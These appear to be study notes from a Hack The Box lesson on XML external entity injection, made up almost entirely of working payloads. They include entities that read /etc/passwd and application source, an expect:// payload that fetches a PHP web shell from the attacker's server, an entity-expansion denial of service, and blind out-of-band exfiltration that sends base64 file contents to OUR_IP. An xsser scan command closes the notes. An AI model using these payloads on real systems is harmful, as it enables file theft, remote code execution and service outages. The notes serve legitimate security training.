# 

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

## Reading Sensitive Files
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

## XXE TO RCE

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:

```
powen@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
powen@htb[/htb]$ sudo python3 -m http.server 80
```

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
> We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.

> The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.


## XXE DOS
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```
This payload defines the a0 entity as DOS, references it in a1 multiple times, references a1 in a2,  
and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache),  
as they protect against entity self-reference

### HTB practice
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"> ]>
<root>
<name>nn</name>
<tel></tel>
<email>&company;</email>
<message>n</message>
</root>
```


## Advanced Exfiltration with CDATA

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

After that, if we reference the &joined; entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:

```
<!ENTITY joined "%begin;%file;%end;">
```

So, let's try to read the submitDetails.php file by first storing the above line in a DTD file (e.g. xxe.dtd), host it on our machine, and then reference it as an external entity on the target web application, as follows:

```
powen@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
powen@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can reference our external entity (xxe.dtd) and then print the &joined; entity we defined above, which should contain the content of the submitDetails.php file, as follows:

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE

First, we will host a DTD file that contains the following payload:

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Now, we can call our external DTD script, and then reference the error entity, as follows:

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

> However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.



# Blind Data Exfiltration

## Out-of-band Data Exfiltration

we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```


```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```
powen@htb[/htb]$ vi index.php # here we write the above PHP code
powen@htb[/htb]$ php -S 0.0.0.0:8000
```

Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root>, which is needed to reference our entity and have it send the request to our machine with the file content:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

> In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.


## Automated OOB Exfiltration

### XXEinjector
https://github.com/enjoiz/XXEinjector

---

> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.


> In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.


# xsser

```
xsser -u 'http://10.129.122.203/' -g '/phishing/index.php?url=XSS'
```
